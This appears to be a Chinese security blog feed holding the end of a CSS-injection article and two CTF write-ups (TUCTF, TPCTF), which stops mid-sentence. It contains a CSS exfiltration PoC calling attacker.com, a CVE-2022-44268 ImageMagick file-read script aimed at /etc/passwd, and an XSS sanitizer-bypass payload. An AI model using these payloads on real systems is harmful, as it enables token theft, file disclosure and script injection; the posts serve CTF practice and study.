comment">// iframe 元素中的 onload 被触发</span>                    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://localhost:12345/?css='</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>css<span class="token punctuation">)</span><span class="token punctuation">;</span>                document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>                <span class="token comment">// 当这个函数被调用时，我们可以确定字体都在缓存中。</span>        <span class="token comment">// 所以让我们尝试用这样的风格来攻击，因为如果你点击这些字符，就会在 token 中出现一个滚动条</span>        <span class="token keyword">function</span> <span class="token function">createAttackIframe</span><span class="token punctuation">(</span><span class="token parameter">chars</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 我们对所有值进行编码，以便能够将它们安全地放置在 URL 中。</span>                <span class="token keyword">let</span> encodedPrefix<span class="token punctuation">;</span>                <span class="token punctuation">[</span>encodedPrefix<span class="token punctuation">,</span> chars<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>prefix<span class="token punctuation">,</span> chars<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">val</span> <span class="token operator">=></span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">const</span> css <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                @font-face &#123;                    font-family: "hack";                    src: url(http://attacker.com/font/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>encodedPrefix<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>chars<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)                &#125;                script &#123;                    display: table;                    font-family: "hack";                    white-space: nowrap;                &#125;                body::-webkit-scrollbar &#123;                    background: blue;                &#125;                body::-webkit-scrollbar:horizontal &#123;                    background: blue url(http://attacker.com/reverse/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>chars<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">);                &#125;                </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>                            <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                iframe<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://localhost:12345/?css='</span> <span class="token operator">+</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>css<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 该 iframe 必须相对较窄 - 滚动条才会出现。</span>                iframe<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token string">"40px"</span><span class="token punctuation">;</span>                document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>           <span class="token punctuation">&#125;</span>                <span class="token comment">// 每 20 毫秒检查一次，看看是否生成了通过滚动条产生了返回请求。如果是这样，我们就从字符 cookie 返回值。</span>        <span class="token keyword">function</span> <span class="token function">getCharsFromReverseConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">const</span> interval <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">const</span> chars <span class="token operator">=</span> Cookies<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'chars'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token function">clearInterval</span><span class="token punctuation">(</span>interval<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">resolve</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>                <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token parameter">time</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="10-参考来源"><a href="#10-参考来源" class="headerlink" title="10. 参考来源"></a>10. 参考来源</h2><p>[1] <a href="https://xsleaks.dev/docs/attacks/css-injection/">CSS Injection</a><br>[2] <a href="https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d">Exfiltration via CSS Injection.</a> by d0nut<br>[3] <a href="https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b">Better Exfiltration via HTML Injection</a> by d0nut<br>[4] <a href="https://x-c3ll.github.io/posts/CSS-Injection-Primitives">CSS Injection Primitives</a> by TheXC3LL<br>[5] <a href="https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail">Code Vulnerabilities Put Proton Mails at Risk</a> by Paul Gerstex<br>[6] <a href="https://www.youtube.com/watch?v=pnbZMvCPqSc">Stealing With Style: Using CSS to Exploit ProtonMail &amp; Friends - Black Hat Asia 2023</a> by Paul Gerste<br>[7] <a href="https://css-tricks.com/child-and-sibling-selectors/">child-and-sibling-selectors</a><br>[8] <a href="https://github.com/d0nutptr/sic">Sequential Import Chaining - GitHub</a><br>[9] <a href="https://blog.huli.tw/2022/09/29/css-injection-1/">用 CSS 來偷資料 - CSS injection（上）</a> by Huli<br>[10] <a href="https://caniuse.com/css-has">:has() CSS relational pseudo-class</a><br>[11] <a href="https://blog.huli.tw/2022/09/29/css-injection-2/">用 CSS 來偷資料 - CSS injection（下）</a> by Huli<br>[12] <a href="https://blog.huli.tw/2023/12/11/0ctf-2023-writeup/">0CTF 2023 筆記</a> by Huli<br>[13] <a href="https://github.com/salvatore-abello/CTF-Writeups/blob/main/0ctf%20-%202023/newdiary/README.md">salvatore-abello&#x2F;CTF-Writeups&#x2F;0ctf - 2023&#x2F;newdiary - GitHub</a><br>[14] <a href="https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/">Stealing Data in Great style – How to Use CSS to Attack Web Application.</a> by MICHAŁ BENTKOWSKI </p>]]></content>
      
      
      <categories>
          
          <category> Skill </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 TUCTF WriteUp</title>
      <link href="/write-up/2023-tuctf-writeup/"/>
      <url>/write-up/2023-tuctf-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="PNG-and-Jelly-Sandwich"><a href="#PNG-and-Jelly-Sandwich" class="headerlink" title="PNG and Jelly Sandwich"></a>PNG and Jelly Sandwich</h1><p><img src="image-1.png" alt="image-1.png"></p><h2 id="1-ImageMagick-识别"><a href="#1-ImageMagick-识别" class="headerlink" title="1. ImageMagick 识别"></a>1. ImageMagick 识别</h2><p>根据题目描述提示使用 Open Source Software<br>以及界面中提示的 Magic Image Resizer<br>联想到 开源图片处理软件 ImageMagick</p><h2 id="2-CVE-2022-44268-任意文件读取"><a href="#2-CVE-2022-44268-任意文件读取" class="headerlink" title="2. CVE-2022-44268 任意文件读取"></a>2. CVE-2022-44268 任意文件读取</h2><p>搜索相关CVE发现是<br><a href="https://github.com/Sybil-Scan/imagemagick-lfi-poc">CVE-2022-44268 ImageMagick 任意文件读取漏洞</a></p><blockquote><p>漏洞原理是利用图片中的 profile 部分进行任意文件读取</p></blockquote><p>使用网站中现成的脚本测试漏洞</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># generate.py</span><span class="token keyword">import</span> png <span class="token comment"># pip install pypng</span><span class="token keyword">import</span> argparse<span class="token keyword">import</span> os<span class="token keyword">import</span> time<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> PngImagePlugin<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n   [\u001b[32;1m>\u001b[0m] ImageMagick LFI PoC - by Sybil Scan Research &lt;research@sybilscan.com>"</span><span class="token punctuation">)</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'imagemagick-LFI : PoC for CVE-2022-44268'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-f'</span><span class="token punctuation">,</span><span class="token string">'--lfile'</span> <span class="token punctuation">,</span> <span class="token builtin">help</span> <span class="token operator">=</span> <span class="token string">'Local file to read'</span> <span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-o'</span><span class="token punctuation">,</span> <span class="token string">'--output'</span><span class="token punctuation">,</span> <span class="token builtin">help</span> <span class="token operator">=</span> <span class="token string">'Output png file'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"   [\u001b[32;1m>\u001b[0m] Generating Blank PNG"</span><span class="token punctuation">)</span>    width <span class="token operator">=</span> <span class="token number">255</span>    height <span class="token operator">=</span> <span class="token number">255</span>    img <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        row <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>            row <span class="token operator">=</span> row <span class="token operator">+</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span> <span class="token operator">-</span> x <span class="token operator">-</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span>        img<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'gradient.png'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        w <span class="token operator">=</span> png<span class="token punctuation">.</span>Writer<span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">,</span> greyscale<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        w<span class="token punctuation">.</span>write<span class="token punctuation">(</span>f<span class="token punctuation">,</span> img<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"   [\u001b[32;1m>\u001b[0m] Blank PNG generated"</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"   [\u001b[32;1m>\u001b[0m] Placing Payload to read </span><span class="token interpolation"><span class="token punctuation">&#123;</span>args<span class="token punctuation">.</span>lfile<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    info <span class="token operator">=</span> PngImagePlugin<span class="token punctuation">.</span>PngInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    info<span class="token punctuation">.</span>add_text<span class="token punctuation">(</span><span class="token string">"profile"</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>lfile<span class="token punctuation">)</span>    im <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"gradient.png"</span><span class="token punctuation">)</span>    im<span class="token punctuation">.</span>save<span class="token punctuation">(</span>args<span class="token punctuation">.</span>output<span class="token punctuation">,</span> <span class="token string">"PNG"</span><span class="token punctuation">,</span> pnginfo<span class="token operator">=</span>info<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"   [\u001b[32;1m>\u001b[0m] PoC PNG generated > </span><span class="token interpolation"><span class="token punctuation">&#123;</span>args<span class="token punctuation">.</span>output<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        gradient_file <span class="token operator">=</span> <span class="token string">"gradient.png"</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>gradient_file<span class="token punctuation">)</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>gradient_file<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">python3 generate.py <span class="token parameter variable">-f</span> <span class="token string">"/etc/passwd"</span> <span class="token parameter variable">-o</span> exploit.png</code></pre><p>将生成后的 exploit.png 上传至网站并下载回传图片<br>使用 cyberchef 对 exif 进行解密</p><p>我们得到了 &#x2F;etc&#x2F;passwd 的内容<br>并从中得知目录和文件相关信息：&#x2F;challenge&#x2F;flag.txt</p><p>对其进行读取</p><pre class="language-bash" data-language="bash"><code class="language-bash">python3 generate.py <span class="token parameter variable">-f</span> <span class="token string">"/challenge/flag.txt"</span> <span class="token parameter variable">-o</span> exploit.png</code></pre><p>读取回传照片时发现 exif 并没有显示数据<br>但在原始文件中我们发现其中包含一个 175 Bytes 的数据</p><p>使用 cyberchef 进行解密我们得到</p><pre class="language-none"><code class="language-none">Sorry, Grandma viewed this Sunday, November 12, 2023 at exactly 13:23:48 (GMT).</code></pre><h2 id="3-时间戳命名"><a href="#3-时间戳命名" class="headerlink" title="3. 时间戳命名"></a>3. 时间戳命名</h2><p>此时结合回传图片的图片名<br>我们发现回传图片的图片名是使用时间戳命名的<br>我们使用这个时间的时间戳读取照片 <code>IM-1699795428.000000.png</code><br>获得如下图片：</p><p><img src="image-2.png" alt="image-2.png"></p><p>得到 flag ：</p><pre class="language-none"><code class="language-none">TUCTF&#123;cL4ss1c_CVE_ch4LL_L0L&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 TPCTF WriteUp</title>
      <link href="/write-up/2023-tpctf-writeup/"/>
      <url>/write-up/2023-tpctf-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="walk-off-the-earth"><a href="#walk-off-the-earth" class="headerlink" title="walk off the earth"></a>walk off the earth</h1><h2 id="1-sha256-爆破"><a href="#1-sha256-爆破" class="headerlink" title="1. sha256 爆破"></a>1. sha256 爆破</h2><p>要实现 xss ，需要先爆破出 <code>sha256</code> 表达式</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>pow <span class="token operator">=</span> <span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> path<span class="token punctuation">,</span> pow <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span><span class="token punctuation">(</span>pow <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> pow <span class="token operator">==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>pow <span class="token operator">+</span> pow<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> difficulty<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span>difficulty<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>即 <code>random_bytes(8) + ??? = 0000000(7)…</code></p><p>假设 <code>?</code> 处为 8位，使用 <code>pwnlib</code> 的 <code>mbruteforce</code> 进行爆破，脚本如下：</p><pre class="language-none"><code class="language-none">base &#x3D; &#39;6dc4a026ee67675e&#39;from pwn import *import hashlibdef test(suffix):    # Concatenate the base and suffix    data &#x3D; base + suffix    # Calculate the SHA256 hash    hash_value &#x3D; hashlib.sha256(data.encode()).hexdigest()    # Check if the hash value starts with &#39;0000000(7)&#39;    if hash_value.startswith(&#39;0000000&#39;):        return True    else:        return Falseif __name__&#x3D;&#x3D;&#39;__main__&#39;:    pwnlib.util.iters.mbruteforce(test, string.digits + string.ascii_letters + string.punctuation, 8,&#39;fixed&#39;)</code></pre><h2 id="2-throw-error-构造"><a href="#2-throw-error-构造" class="headerlink" title="2. throw error 构造"></a>2. throw error 构造</h2><h3 id="2-1-构造位置确定"><a href="#2-1-构造位置确定" class="headerlink" title="2.1 构造位置确定"></a>2.1 构造位置确定</h3><p>根据 <code>visit.js</code> 中给出的代码逻辑<br>我们可以在以下两个位置实现 <code>throw error</code><br>并保证在 res 不被替换的情况下带出 flag</p><p>第一处：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'domcontentloaded'</span><span class="token punctuation">,</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">2000</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>第二处：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">waitForFunction</span><span class="token punctuation">(</span><span class="token parameter">text</span> <span class="token operator">=></span> document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">2000</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span>e <span class="token keyword">instanceof</span> <span class="token class-name">puppeteer<span class="token punctuation">.</span>ProtocolError</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>message<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'Target closed'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>其中第二处对 error 的类型有限定</p><p>通过第二处带出 flag 其实为 <code>walk off the solar system</code> 一题的解<br>因此本题仅讨论通过第一处 <code>throw error</code> 带出 flag</p><h3 id="2-2-命名空间混淆绕过-sanitize"><a href="#2-2-命名空间混淆绕过-sanitize" class="headerlink" title="2.2 命名空间混淆绕过 sanitize"></a>2.2 命名空间混淆绕过 sanitize</h3><p>由于在第一处 <code>throw error</code> 需要造成至少 2000 ms 的 timeout<br>我们需要通过 text arg 来完成对目标页面的脚本注入</p><p>但是已知 <code>sanitize</code> 函数会对 DOM node 的 <code>tag</code> 和 <code>attributes</code> 进行过滤<br>因此此处需要利用命名空间混淆来绕过过滤</p><h4 id="命名空间混淆"><a href="#命名空间混淆" class="headerlink" title="命名空间混淆"></a>命名空间混淆</h4><p>如果在浏览器中提供以下 HTML</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span> Hello     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span> World        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span><span class="token punctuation">></span></span></code></pre><p>然后它将解析为 DOM</p><pre class="language-none"><code class="language-none">└──HTML   ├──HEAD   └──BODY      └──FORM         ├──#text: Hello World         └──IMG</code></pre><p>在浏览器中，表单元素本身不能嵌套<br>如果它像上面给出的那样嵌套<br>它将从 DOM 中删除内部表单标签</p><p>但是嵌套表单标签在 JSDOM 中可以存在的</p><p>由于 JSDOM 中嵌套标签的解析不一致<br><code>sanitize</code> 会将其视为普通标签<br>但在浏览器中它会触发 XSS Script</p><p>该漏洞是</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>然后JSDOM将其序列化为</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">&lt;/math>&lt;script><span class="token function">alert</span><span class="token punctuation">(</span>10<span class="token punctuation">)</span>&lt;/script></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>但浏览器认为这是</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>该漏洞将解析为 DOM</p><pre class="language-none"><code class="language-none">└──HTML   ├──HEAD   └──BODY      ├──FORM      │  ├──math      │  │  └──mtext      │  │     └──mglyph      │  │        └──style      │  └──SCRIPT      │     └──#text: alert(10)      └──#text:</code></pre><p>这是因为表单元素是另一个表单的直接子元素，这是不可能的<br>因此内部表单标签从 DOM 中删除了<br>然后，标签会关闭之前的标签，脚本标签会出现在外面</p><p>这样我们就实现了绕过 <code>sanitize</code></p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre class="language-markup" data-language="markup"><code class="language-markup">/note?text=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span>&lt;audio src=x  onerror=alert("xss");><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>&lt;audio src=x  onerror=alert("xss");></code></pre><p>该 payload 